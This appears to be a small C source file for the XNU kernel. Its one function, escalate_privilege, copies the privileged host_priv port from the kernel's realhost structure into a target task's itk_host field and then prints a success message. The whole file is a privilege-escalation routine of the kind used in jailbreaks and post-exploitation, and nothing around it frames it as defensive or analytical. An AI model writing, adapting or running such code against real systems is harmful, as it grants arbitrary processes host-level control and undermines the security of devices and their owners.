// Assign realhost privilege to task

// Assign realhost privilege to task
#include <mach/mach_types.h>
#include <mach/mach_vm.h>
#include <mach/mach_host.h>
#include <libkern/libkern.h>
#include <kern/task.h>
#include <kern/ipc_tt.h>
#include "../privilege/host_privilege.h"

extern task_t kernel_task;
extern struct host *realhost;  // Must be resolved or passed via symbol

void escalate_privilege(task_t target_task) {
    if (!realhost) {
        printf("[-] realhost not initialized.\n");
        return;
    }

    ipc_port_t host_priv_port = realhost->special[2]; // Index 2 = host_priv
    if (!host_priv_port) {
        printf("[-] host_priv port is NULL.\n");
        return;
    }

    target_task->itk_host = host_priv_port;
    printf("[+] Elevated task to host_priv\n");
}